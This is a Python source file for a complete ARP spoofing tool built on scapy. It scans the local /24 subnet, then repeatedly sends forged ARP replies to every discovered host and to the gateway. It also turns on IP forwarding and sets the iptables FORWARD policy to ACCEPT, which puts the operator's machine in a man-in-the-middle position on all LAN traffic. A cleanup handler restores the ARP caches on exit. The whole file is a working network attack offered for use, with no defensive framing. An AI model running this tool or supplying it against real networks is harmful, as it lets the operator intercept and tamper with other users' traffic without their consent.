import scapy.all as scapy
import subprocess
import sys
from termcolor import cprint
import time
import netifaces
import os
import signal



#    ▄▀▄▄ █▄▄  ▄▄█ ▄▄    ▄▄          ▄▀▀▄  █▄▄▀▀▄  █▄▄▀▀▄        ▄▄▄▄▄  █▄▄▀▀▄   ▄▀▀▄   ▄▀▀▄   ▄▀▄▄  ▄▄▄▄ █▄▄▀▀▄ 
#   ▄█     ██  ██  ██    ██         ▓█  █▄  ██  █▄  ██  █▄      ██   ▒█  ██  █▄ ▄█  █▄ ▄█  █▄ ▄█    ▄█ ▀▀  ██  █▄
#   ██     ██  ██  ██    ██         ██  ██  ██  █▀  ██  █▀      ▀▀▄▄▄    ██  █▀ ██  ██ ██  ██ ██    ██     ██  █▀
#   ████   ██  ▒▒  ▓▓    ▓▓         ██▀▀██  ██▄▄▀   ██▄▄▀         ▀▀▀▒▄  ██▄▄▀  ██  ██ ██  ██ ████  ▓▓▄▄   ██▄▄▀ 
#   ▓▓     ▓▓  ▓▓  ▓▓    ▓▓         ▓▓  ▓▓  ▓▓  ▄▄  ▓▓          ▄▄   ▓▓  ▓▓     ▓▓  ▓▓ ▓▓  ▓▓ ▓▓    ▓▓     ▓▓  ▄▄
#   ██     ▀█  █▀  ▀█    ▀█         ██  ██  ██  ██  ██          ▀█   ██  ██     ▀█  █▀ ▀█  █▀ ██    ▀█     ██  ██
#   ▀▀      ▀▄▄▀    ▀▀▀   ▀▀▀       ▀▀  ██ ▄▀▀  ▀▀ ▄▀▀           ▀▀██▀  ▄▀▀      ▀▄▄▀   ▀▄▄▀  ▀▀     ▀▀▀  ▄▀▀  ▀▀


    #Save ip and mac from the scan
ip_and_mac = []
arp_counter = 0


def detect_ip(submask, interface):
    ip = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
    
    if submask == "/24":
        ip = ".".join(ip.split(".")[:3]) + ".0"
    else:
        cprint("[!] Red mask not allowed", "red")
        sys.exit(1)
    return ip


def get_mac():
    gateways = netifaces.gateways()
    interface = gateways['default'][netifaces.AF_INET][1]
    mac = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
    return mac
#------

def arp_scanner(ip_and_submask):
        #list of lists
    global ip_and_mac
    ip_and_mac = []

    cprint("[+] Scanning The Network throught ARP", "yellow")

        #Destin to all ips of the submask
    arp = scapy.ARP(pdst=ip_and_submask)
        #Destin to the broadcast
    eth = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    packet = eth/arp

    answered, unanswered = scapy.srp(packet, timeout=1, verbose=False)

    for sent,received in answered:
                #psrc => Protocol Source, hwsrc => Hardware Source
        print(">", received.psrc, " " ,received.hwsrc)
        ip_and_mac.append([received.psrc, received.hwsrc])

    return ip_and_mac

#------       

def send_packet(ip_device, mac_target, ip_spoof, mac_source):
    arp = scapy.ARP(op=2,psrc=ip_spoof,pdst=ip_device, hwsrc=mac_source, hwdst=mac_target)
    eth = scapy.Ether(dst=mac_target)

    packet = eth/arp

    scapy.sendp(packet, verbose=False)


def arp_spoofer(ip_and_mac, gateway, my_mac, gateway_mac):
    global arp_counter
    if arp_counter < 1:
        cprint("[+] Starting Spoof", "grey")

    for couple in ip_and_mac:
        ip_device, mac_device = couple

            #My_ip
        if ip_device == scapy.conf.route.route("0.0.0.0")[1]:
            continue
            #Gateway_ip
        elif ip_device == scapy.conf.route.route("0.0.0.0")[2]:
            continue

        #Send to the device
        send_packet(ip_device,mac_device,gateway,my_mac)
        #Send to the gateway
        send_packet(gateway,gateway_mac,ip_device,my_mac)

    if arp_counter < 1:
        cprint("\n[+] Active spoofing", "green")

        arp_counter +=1
        

def detect_type_of_submask(submask):
    if submask == "255.255.255.0":
        return "/24"
    elif submask == "255.255.0.0":
        return "/16"
    cprint("[!] Submask Not supported","red")
    sys.exit(1)

def main():
    global gateway, gateway_mac
    my_mac = get_mac()
    gateway = scapy.conf.route.route("0.0.0.0")[2] #gateway IP
    gateway_mac = scapy.getmacbyip(gateway)


    # -(START) GET SUBMASK
    gateways = netifaces.gateways()
    interface = gateways['default'][netifaces.AF_INET][1]

    direcciones = netifaces.ifaddresses(interface)
    submask = direcciones[netifaces.AF_INET][0]['netmask']
    submask_str = detect_type_of_submask(submask)
    # -(END) GET SUBMASK

    ip_range = detect_ip(submask_str, interface) 
    ip_and_submask = f"{ip_range}{submask_str}"

    ip_and_mac = arp_scanner(ip_and_submask) # ARGS = "192.168.100.0", "/24"    OUT = [[192.168.100.24   74:ec:b2:05:c4:a1],]

    while True:
        arp_spoofer(ip_and_mac, gateway, my_mac, gateway_mac)
        time.sleep(2)


#             _ _   
#     _____ _(_) |_ 
#    / -_) \ / |  _|
#    \___/_\_\_|\__|
                

def exit_handler(sig, frame):
    cprint("\n[!] Exiting the script... ", "red")
    # Restore fordware rules
    cprint("[~] Restoring fordware rules", "grey")
    subprocess.run(f"echo {orig_ip_forward} > /proc/sys/net/ipv4/ip_forward", shell=True)
    subprocess.run(f"iptables -P FORWARD {orig_forward_policy}", shell=True)   

    # Restore arp list on target devices

    if not ip_and_mac:
        sys.exit(1)

    for _ in range(7):
        for couple in ip_and_mac: # [[192.168.100.24   74:ec:b2:05:c4:a1],]
                ip_device, mac_device = couple
        
                # Send to the device the real gateway mac
                send_packet(ip_device, mac_device, gateway, gateway_mac) #send_packet(ip_device, mac_target, ip_spoof, my_mac):
        
                # Send to the router the real device mac
                send_packet(gateway, gateway_mac, ip_device, mac_device) #send_packet(ip_device, mac_target, ip_spoof, my_mac):
    cprint("\n[+] Exited successfully ", "green")
    sys.exit(0)
    
    



if __name__ == "__main__":
    
    orig_ip_forward = subprocess.run("cat /proc/sys/net/ipv4/ip_forward",shell=True, capture_output=True, text=True).stdout.strip()
    
    orig_forward_policy = subprocess.run("iptables -L FORWARD -n | awk 'NR==1{print $4}'",shell=True, capture_output=True, text=True).stdout.strip().replace(")","")

    signal.signal(signal.SIGINT, exit_handler)

    if orig_forward_policy not in ("ACCEPT", "DROP", "REJECT"):
        cprint(f"[!] Could not detect FORWARD policy, defaulting to DROP", "yellow")
        orig_forward_policy = "DROP"
    
    if os.getuid() != 0:
        cprint("[!] It is required root to run this script...", "red")
        sys.exit(1)
    
    # Activate IP Forwarding
    cprint("IP forwarding active << /proc/sys/net/ipv4/ip_forward >>", "green")
    subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    cprint("FORWARD policy changed to ACCEPT", "green")
    subprocess.run("iptables -P FORWARD ACCEPT", shell=True)

    main()
